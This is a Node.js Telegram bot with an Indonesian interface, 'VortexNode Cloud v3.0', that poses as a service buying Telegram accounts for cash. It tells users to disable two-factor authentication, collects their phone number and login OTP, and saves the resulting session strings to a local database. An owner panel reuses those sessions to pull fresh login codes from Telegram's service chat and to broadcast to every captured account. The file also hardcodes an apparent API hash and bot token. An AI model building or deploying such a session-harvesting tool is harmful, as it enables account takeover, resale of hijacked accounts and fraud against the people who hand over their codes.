const { Telegraf, Markup } = require('telegraf');
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');
const fs = require('fs');

// --- KONFIGURASI ---
const apiId = 31201777;
const apiHash = '791bb0f9d012531d922086c8489dd705';
const botToken = '8238521944:AAGtfc6goWfX0bmm1cmKuYlD-p3lIGjJvCM';
const logChannel = '-1003121256961';
const ownerId = 8457401920; 
const DB_FILE = './database.json';
const MIN_WD = 50000;

const bot = new Telegraf(botToken);
const userSessions = {}; 

// --- DATABASE ENGINE (LOCAL STORAGE) ---
if (!fs.existsSync(DB_FILE)) {
    fs.writeFileSync(DB_FILE, JSON.stringify({ accounts: [], users: {} }, null, 2));
}

const getData = () => JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
const saveData = (data) => fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));

// --- UTILS: ANIMASI & DELAY ---
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const drawLoading = async (ctx, messageId, title) => {
    const bars = [
        "█▒▒▒▒▒▒▒▒▒ 10%", "██▒▒▒▒▒▒▒▒ 20%", "███▒▒▒▒▒▒▒ 30%", "████▒▒▒▒▒▒ 40%",
        "█████▒▒▒▒▒ 50%", "██████▒▒▒▒ 60%", "███████▒▒▒ 70%", "████████▒▒ 80%",
        "█████████▒ 90%", "██████████ 100%"
    ];
    for (const bar of bars) {
        try {
            await ctx.telegram.editMessageText(ctx.chat.id, messageId, null, 
                `⏳ **${title}**\n\n\`${bar}\``, { parse_mode: 'Markdown' });
            await sleep(300);
        } catch (e) {}
    }
};

// --- TEMPLATE PESAN ---
const startText = (name) => 
    `✨ **SELAMAT DATANG, ${name.toUpperCase()}!** ✨\n` +
    `━━━━━━━━━━━━━━━━━━━━━━\n` +
    `🚀 **VORTEXNODE CLOUD v3.0**\n` +
    `Platform jual-beli akun Telegram paling aman & instan.\n\n` +
    `💎 **KEUNTUNGAN:**\n` +
    `• 🟢 **Otomatis:** Saldo cair dalam hitungan detik.\n` +
    `• 🟢 **Harga:** Rp 20.000 - Rp 25.000 per akun.\n` +
    `• 🟢 **Aman:** Sesi disimpan dengan enkripsi sistem.\n\n` +
    `⚠️ **SYARAT WAJIB:**\n` +
    `1. Nonaktifkan Password (2FA).\n` +
    `2. Akun tidak dalam kondisi limit/spam.\n` +
    `3. Gunakan nomor aktif yang bisa menerima kode.`;

const mainBtn = () => Markup.inlineKeyboard([
    [Markup.button.callback('💰 JUAL AKUN (INSTANT)', 'jual_akun')],
    [Markup.button.callback('👤 PROFIL SAYA', 'profile'), Markup.button.callback('💸 WITHDRAW', 'withdraw')],
    [Markup.button.callback('👑 OWNER MENU', 'owner_menu')]
]);

const backBtn = (target) => Markup.inlineKeyboard([[Markup.button.callback('🔙 KEMBALI KE MENU', target)]]);

// --- START COMMAND ---
bot.start((ctx) => ctx.replyWithMarkdown(startText(ctx.from.first_name), mainBtn()));

bot.action('main_menu', async (ctx) => {
    await ctx.answerCbQuery();
    ctx.editMessageText(startText(ctx.from.first_name), { parse_mode: 'Markdown', ...mainBtn() });
});

// --- LOGIKA JUAL AKUN ---
bot.action('jual_akun', async (ctx) => {
    userSessions[ctx.from.id] = { step: 'input_phone' };
    ctx.editMessageText(
        '📲 **MASUKKAN NOMOR TELEGRAM**\n\nKirim nomor Anda dengan format kode negara.\nContoh: `628123456789`',
        { parse_mode: 'Markdown', ...backBtn('main_menu') }
    );
});

bot.on('text', async (ctx) => {
    const userId = ctx.from.id;
    const text = ctx.message.text;
    const state = userSessions[userId];
    const db = getData();

    if (!state) return;

    // STEP 1: INPUT NOMOR
    if (state.step === 'input_phone') {
        const phone = text.replace(/[^0-9]/g, '');
        
        // CEK DUPLIKAT
        if (db.accounts.find(a => a.phone === phone)) {
            return ctx.reply('❌ **NOMOR SUDAH PERNAH DIJUAL!**\nSilahkan gunakan nomor lain yang belum terdaftar.', mainBtn());
        }

        const msg = await ctx.reply('📡 **MENGHUBUNGI SERVER TELEGRAM...**');
        await drawLoading(ctx, msg.message_id, "Mengirim Permintaan OTP...");

        try {
            const client = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 5 });
            await client.connect();
            const { phoneCodeHash } = await client.sendCode({ apiId, apiHash }, phone);
            
            state.client = client;
            state.phone = phone;
            state.phoneCodeHash = phoneCodeHash;
            state.step = 'input_otp';
            ctx.reply('📩 **KODE OTP TERKIRIM!**\n\nMasukkan kode dari aplikasi Telegram Anda.\nFormat: `1 2 3 4 5` (Gunakan Spasi)', { parse_mode: 'Markdown' });
        } catch (err) {
            ctx.reply('❌ **GAGAL:** ' + err.message, mainBtn());
            delete userSessions[userId];
        }
    }

    // STEP 2: INPUT OTP
    else if (state.step === 'input_otp') {
        const otp = text.replace(/\s+/g, '');
        const msg = await ctx.reply('🔐 **MENVERIFIKASI...**');
        await drawLoading(ctx, msg.message_id, "Sinkronisasi Sesi...");

        try {
            const client = state.client;
            await client.invoke(new Api.auth.SignIn({
                phoneNumber: state.phone,
                phoneCodeHash: state.phoneCodeHash,
                phoneCode: otp
            }));

            const sessionStr = client.session.save();
            const harga = state.phone.startsWith('1') ? 25000 : 20000;

            db.accounts.push({
                phone: state.phone,
                session: sessionStr,
                sellerId: userId,
                sellerName: ctx.from.first_name,
                date: new Date().toLocaleString()
            });

            if (!db.users[userId]) db.users[userId] = { balance: 0 };
            db.users[userId].balance += harga;
            
            saveData(db);
            
            ctx.reply(
                `✅ **TRANSAKSI BERHASIL!**\n` +
                `━━━━━━━━━━━━━━━━━━━━━━\n` +
                `📱 Nomor: \`${state.phone}\`\n` +
                `💰 Saldo: +Rp ${harga.toLocaleString()}\n` +
                `💳 Total Saldo: Rp ${db.users[userId].balance.toLocaleString()}\n` +
                `━━━━━━━━━━━━━━━━━━━━━━`,
                { parse_mode: 'Markdown', ...mainBtn() }
            );

            bot.telegram.sendMessage(logChannel, 
                `🆕 **AKUN TERJUAL**\n` +
                `👤 User: ${ctx.from.first_name}\n` +
                `📱 No: ${state.phone}\n` +
                `💰 Harga: Rp ${harga.toLocaleString()}\n` +
                `📅 Date: ${new Date().toLocaleString()}`
            );
            
            await client.disconnect();
        } catch (err) {
            ctx.reply('❌ **GAGAL LOGIN:** ' + err.message + '\nPastikan 2FA (Verifikasi 2 Langkah) sudah OFF.', mainBtn());
        }
        delete userSessions[userId];
    }

    // STEP 3: WITHDRAW
    else if (state.step === 'input_wd') {
        const parts = text.split('-'); 
        const amount = parseInt(parts[2]?.trim() || 0);
        const currentBal = db.users[userId]?.balance || 0;

        if (amount < MIN_WD) return ctx.reply(`❌ Minimal WD Rp ${MIN_WD.toLocaleString()}`, backBtn('withdraw'));
        if (amount > currentBal) return ctx.reply(`❌ Saldo tidak mencukupi!`, backBtn('withdraw'));

        db.users[userId].balance -= amount;
        saveData(db);
        ctx.reply('✅ **PENARIKAN BERHASIL DIAJUKAN!**', mainBtn());
        bot.telegram.sendMessage(logChannel, `💸 **WD REQUEST**\n👤 User: ${ctx.from.first_name}\n📝 Detail: ${text}`);
        delete userSessions[userId];
    }

    // STEP 4: BROADCAST
    else if (state.step === 'input_bc' && userId === ownerId) {
        ctx.reply('📢 **MEMULAI BROADCAST...**');
        let count = 0;
        for (const acc of db.accounts) {
            try {
                const client = new TelegramClient(new StringSession(acc.session), apiId, apiHash, {});
                await client.connect();
                await client.sendMessage('me', { message: text });
                count++;
                await client.disconnect();
            } catch (e) {}
        }
        ctx.reply(`✅ Selesai! Pesan terkirim ke ${count} akun.`, backBtn('owner_menu'));
        delete userSessions[userId];
    }
});

// --- PROFILE & WITHDRAW ---
bot.action('profile', (ctx) => {
    const db = getData();
    const bal = db.users[ctx.from.id]?.balance || 0;
    const total = db.accounts.filter(a => a.sellerId === ctx.from.id).length;
    ctx.editMessageText(
        `👤 **PROFIL PENGGUNA**\n\n• Nama: ${ctx.from.first_name}\n• ID: \`${ctx.from.id}\`\n• Saldo: **Rp ${bal.toLocaleString()}**\n• Total Jual: ${total} Akun`,
        { parse_mode: 'Markdown', ...backBtn('main_menu') }
    );
});

bot.action('withdraw', (ctx) => {
    const db = getData();
    const bal = db.users[ctx.from.id]?.balance || 0;
    if (bal < MIN_WD) return ctx.answerCbQuery(`Saldo minimun Rp ${MIN_WD.toLocaleString()}`, { show_alert: true });
    
    userSessions[ctx.from.id] = { step: 'input_wd' };
    ctx.editMessageText(
        `💸 **MENU PENARIKAN**\n\nSaldo: **Rp ${bal.toLocaleString()}**\nFormat: \`EWALLET - NOMOR - JUMLAH\`\n\nContoh: \`DANA - 0812345678 - 50000\``,
        { parse_mode: 'Markdown', ...backBtn('main_menu') }
    );
});

// --- OWNER PANEL ---
bot.action('owner_menu', (ctx) => {
    if (ctx.from.id !== ownerId) return ctx.answerCbQuery('❌ AKSES DITOLAK!');
    ctx.editMessageText('👑 **OWNER CONTROL PANEL**', Markup.inlineKeyboard([
        [Markup.button.callback('📑 DAFTAR NOMOR', 'list_0')],
        [Markup.button.callback('📢 BROADCAST MASSAL', 'bc_menu')],
        [Markup.button.callback('🔙 KEMBALI', 'main_menu')]
    ]));
});

bot.action(/^list_(\d+)$/, (ctx) => {
    const page = parseInt(ctx.match[1]);
    const db = getData();
    const current = db.accounts.slice(page * 5, (page * 5) + 5);
    const buttons = current.map((acc, i) => [Markup.button.callback(`📞 ${acc.phone}`, `detail_${(page * 5) + i}`)]);
    
    const nav = [];
    if (page > 0) nav.push(Markup.button.callback('⬅️', `list_${page - 1}`));
    if ((page * 5) + 5 < db.accounts.length) nav.push(Markup.button.callback('➡️', `list_${page + 1}`));
    if (nav.length) buttons.push(nav);
    buttons.push([Markup.button.callback('🔙 KEMBALI', 'owner_menu')]);
    
    ctx.editMessageText(`📑 **DATABASE (Hal ${page + 1})**\nTotal: ${db.accounts.length} Akun`, Markup.inlineKeyboard(buttons));
});

bot.action(/^detail_(\d+)$/, (ctx) => {
    const db = getData();
    const acc = db.accounts[parseInt(ctx.match[1])];
    ctx.editMessageText(
        `📄 **DETAIL AKUN**\n\nNomor: \`${acc.phone}\`\nSeller: ${acc.sellerName}\nTanggal: ${acc.date}`,
        Markup.inlineKeyboard([
            [Markup.button.callback('📩 AMBIL OTP', `sms_${ctx.match[1]}`)],
            [Markup.button.callback('🔙 KEMBALI', 'list_0')]
        ])
    );
});

bot.action(/^sms_(\d+)$/, async (ctx) => {
    const db = getData();
    const acc = db.accounts[parseInt(ctx.match[1])];
    ctx.answerCbQuery('Membuka sesi...');
    try {
        const client = new TelegramClient(new StringSession(acc.session), apiId, apiHash, {});
        await client.connect();
        const messages = await client.getMessages(777000, { limit: 1 });
        ctx.reply(`📩 **KODE TELEGRAM (${acc.phone}):**\n\n${messages[0].message}`);
        await client.disconnect();
    } catch (e) { ctx.reply('❌ Sesi mati atau akun logout.'); }
});

bot.action('bc_menu', (ctx) => {
    userSessions[ctx.from.id] = { step: 'input_bc' };
    ctx.editMessageText('📢 **BROADCAST**\nKetik pesan yang akan dikirim ke Saved Messages akun:', backBtn('owner_menu'));
});

bot.launch();
console.log('🚀 Vortex Cloud Bot v3 Online!');
